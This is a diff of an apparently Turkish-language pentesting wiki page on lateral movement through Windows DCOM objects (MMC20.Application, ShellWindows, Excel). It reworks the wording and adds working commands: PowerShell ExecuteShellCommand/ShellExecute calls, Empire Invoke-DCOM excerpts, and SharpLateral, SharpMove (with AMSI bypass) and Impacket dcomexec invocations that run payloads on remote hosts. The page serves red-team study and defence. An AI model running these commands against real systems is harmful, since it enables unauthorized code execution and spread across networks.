@@ -4,7 +4,7 @@
 
 ## MMC20.Application
 
-**Bu teknik hakkında daha fazla bilgi için orijinal gönderiyi [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) kontrol edin.**
+**Bu teknik hakkında daha fazla bilgi için [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) adresindeki orijinal gönderiyi kontrol edin.**
 
 Dağıtılmış Bileşen Nesne Modeli (DCOM) nesneleri, nesnelerle ağ tabanlı etkileşimler için ilginç bir yetenek sunar. Microsoft, hem DCOM hem de Bileşen Nesne Modeli (COM) için kapsamlı belgeler sağlar; DCOM için [buradan](https://msdn.microsoft.com/en-us/library/cc226801.aspx) ve COM için [buradan](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) erişilebilir. DCOM uygulamalarının bir listesi PowerShell komutu kullanılarak alınabilir:
 ```bash
@@ -12,19 +12,19 @@ Get-CimInstance Win32_DCOMApplication
 ```
 COM nesnesi, [MMC Uygulama Sınıfı (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC eklenti işlemlerinin betimlenmesini sağlar. Özellikle, bu nesne `Document.ActiveView` altında bir `ExecuteShellCommand` yöntemini içerir. Bu yöntem hakkında daha fazla bilgi [burada](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) bulunabilir. Çalıştığını kontrol edin:
 
-Bu özellik, bir DCOM uygulaması aracılığıyla bir ağ üzerinde komutların yürütülmesini kolaylaştırır. DCOM ile uzaktan admin olarak etkileşimde bulunmak için PowerShell aşağıdaki gibi kullanılabilir:
-```powershell
+Bu özellik, bir DCOM uygulaması aracılığıyla bir ağ üzerinden komutların yürütülmesini kolaylaştırır. DCOM ile uzaktan admin olarak etkileşimde bulunmak için PowerShell aşağıdaki gibi kullanılabilir:
+```bash
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
-Bu komut DCOM uygulamasına bağlanır ve COM nesnesinin bir örneğini döndürür. ExecuteShellCommand yöntemi daha sonra uzak ana bilgisayarda bir işlemi yürütmek için çağrılabilir. İşlem aşağıdaki adımları içerir:
+Bu komut, DCOM uygulamasına bağlanır ve COM nesnesinin bir örneğini döndürür. ExecuteShellCommand yöntemi daha sonra uzak ana bilgisayarda bir işlemi yürütmek için çağrılabilir. İşlem aşağıdaki adımları içerir:
 
-Yöntemleri kontrol et:
-```powershell
+Check methods:
+```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
 RCE Elde Et:
-```powershell
+```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com | Get-Member
 
@@ -42,21 +42,26 @@ Açık Launch Permissions eksikliği nedeniyle iki özel nesne, `ShellBrowserWin
 
 ### ShellWindows
 
-ProgID'si olmayan `ShellWindows` için, .NET yöntemleri `Type.GetTypeFromCLSID` ve `Activator.CreateInstance`, AppID'sini kullanarak nesne oluşturmayı kolaylaştırır. Bu süreç, `ShellWindows` için CLSID'yi almak üzere OleView .NET'i kullanır. Oluşturulduktan sonra, `WindowsShell.Item` yöntemi aracılığıyla etkileşim mümkündür ve bu, `Document.Application.ShellExecute` gibi yöntem çağrılarına yol açar.
+ProgID'si olmayan `ShellWindows` için, .NET yöntemleri `Type.GetTypeFromCLSID` ve `Activator.CreateInstance`, AppID'sini kullanarak nesne oluşturmayı kolaylaştırır. Bu işlem, `ShellWindows` için CLSID'yi almak üzere OleView .NET'i kullanır. Oluşturulduktan sonra, `WindowsShell.Item` yöntemi aracılığıyla etkileşim mümkündür ve bu, `Document.Application.ShellExecute` gibi yöntem çağrılarına yol açar.
 
-Nesneyi oluşturmak ve komutları uzaktan çalıştırmak için örnek PowerShell komutları sağlanmıştır:
-```powershell
+Nesneyi oluşturmak ve uzaktan komutlar çalıştırmak için örnek PowerShell komutları sağlanmıştır:
+```bash
+# Example
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
+
+# Need to upload the file to execute
+$COM = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.APPLICATION", "192.168.52.100"))
+$COM.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe", $Null, $Null, "7")
 ```
 ### Lateral Movement with Excel DCOM Objects
 
 Lateral hareket, DCOM Excel nesnelerini istismar ederek gerçekleştirilebilir. Ayrıntılı bilgi için, DCOM üzerinden lateral hareket için Excel DDE'yi kullanma konusundaki tartışmayı [Cybereason'un blogunda](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) okumanız önerilir.
 
-Empire projesi, DCOM nesnelerini manipüle ederek uzaktan kod yürütme (RCE) için Excel'in kullanımını gösteren bir PowerShell betiği sağlar. Aşağıda, RCE için Excel'i istismar etmenin farklı yöntemlerini sergileyen [Empire'ın GitHub deposundaki](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) betikten alıntılar bulunmaktadır:
-```powershell
+Empire projesi, DCOM nesnelerini manipüle ederek uzaktan kod yürütme (RCE) için Excel'in kullanımını gösteren bir PowerShell betiği sağlar. Aşağıda, Excel'i RCE için istismar etmenin farklı yöntemlerini sergileyen [Empire'ın GitHub deposundaki](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) betikten alıntılar bulunmaktadır:
+```bash
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
 $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
@@ -88,12 +93,24 @@ Bu teknikleri otomatikleştirmek için iki araç vurgulanmıştır:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
+- [SharpMove](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
+```
 ## Otomatik Araçlar
 
 - Powershell betiği [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), diğer makinelerde kod çalıştırmanın tüm yorumlanan yollarını kolayca çağırmanıza olanak tanır.
+- Uzak sistemlerde DCOM kullanarak komutlar çalıştırmak için Impacket'in `dcomexec.py` aracını kullanabilirsiniz.
+```bash
+dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
+```
 - Ayrıca [**SharpLateral**](https://github.com/mertdas/SharpLateral) kullanabilirsiniz:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
+```
+- Ayrıca [**SharpMove**](https://github.com/0xthirteen/SharpMove) kullanabilirsiniz.
+```bash
+SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
 ```
 ## Referanslar
 
